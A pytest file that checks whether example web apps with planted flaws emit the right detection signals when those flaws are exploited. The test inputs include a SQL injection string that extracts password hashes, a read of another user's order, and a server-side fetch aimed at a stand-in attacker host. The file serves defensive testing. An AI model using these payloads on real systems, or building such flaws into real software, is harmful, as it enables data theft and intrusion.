"""The examples are the pattern target apps copy, so they are tested like code.

Each one must: report its route template, stay quiet when an endpoint is merely
visited, and raise exactly one signal when the planted flaw is really exploited.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

EXAMPLES = Path(__file__).resolve().parents[1] / "examples"


def load(name: str, telemetry):
    import telemetry_agent
    from telemetry_agent import _client

    _client._ACTIVE = telemetry
    # init_telemetry() inside the example would replace the fixture's client, so it is
    # neutralised: the example's own wiring is what is under test, not its config.
    original_init = telemetry_agent.init_telemetry
    telemetry_agent.init_telemetry = lambda *args, **kwargs: telemetry
    try:
        spec = importlib.util.spec_from_file_location(f"example_{name}", EXAMPLES / f"{name}.py")
        module = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = module
        spec.loader.exec_module(module)
        return module
    finally:
        telemetry_agent.init_telemetry = original_init
        _client._ACTIVE = telemetry


def test_flask_example_raises_its_signal_on_the_effect(telemetry, collector):
    module = load("flask_minimal", telemetry)
    client = module.app.test_client()

    assert client.get("/api/catalog/items?q=laptop").status_code == 200
    telemetry.flush()
    assert collector.of_type("signal") == []  # visiting is not exploiting
    assert collector.of_type("http_request")[-1]["route"] == "/api/catalog/items"

    payload = "x' UNION SELECT id,email,password_hash FROM accounts--"
    assert client.get("/api/catalog/items", query_string={"q": payload}).status_code == 200
    telemetry.flush()
    signals = collector.of_type("signal")
    assert len(signals) == 1
    assert signals[0]["signal"] == "shop.catalog.query.plan_anomaly"
    assert signals[0]["attributes"]["payload"] == payload
    # The catalog id lives in the catalog, never in the target.
    assert "vuln_id" not in signals[0]


def test_fastapi_example_signal_and_outbound(telemetry, collector, monkeypatch):
    pytest.importorskip("fastapi")
    from starlette.testclient import TestClient

    module = load("fastapi_minimal", telemetry)
    monkeypatch.setattr(module, "_fetch", lambda url: None)  # no egress from a unit test

    with TestClient(module.app) as client:
        assert client.get("/api/orders/1001", headers={"cookie": "sid=alice"}).status_code == 200
        telemetry.flush()
        assert collector.of_type("signal") == []  # own order: nothing to count
        event = collector.of_type("http_request")[-1]
        assert event["route"] == "/api/orders/{id}"
        assert event["auth_subject"] == "customer:1"

        assert client.get("/api/orders/1002").status_code == 401
        telemetry.flush()
        assert collector.of_type("signal") == []  # anonymous: nothing to count

        assert client.get("/api/orders/1002", headers={"cookie": "sid=alice"}).status_code == 200
        telemetry.flush()
        signals = collector.of_type("signal")
        assert len(signals) == 1
        assert signals[0]["signal"] == "shop.orders.subject.mismatch"

        client.post(
            "/api/admin/imports",
            headers={"cookie": "sid=alice"},
            json={"source_url": "http://d34d.oob.attacker.example/feed.json"},
        )

    correlation = collector.wait_for_correlations()[-1]
    assert correlation["destination_host"] == "d34d.oob.attacker.example"
    assert correlation["signal"] == "shop.imports.fetch.external"
    assert correlation["route"] == "/api/admin/imports"
    assert correlation["param"] == "source_url"
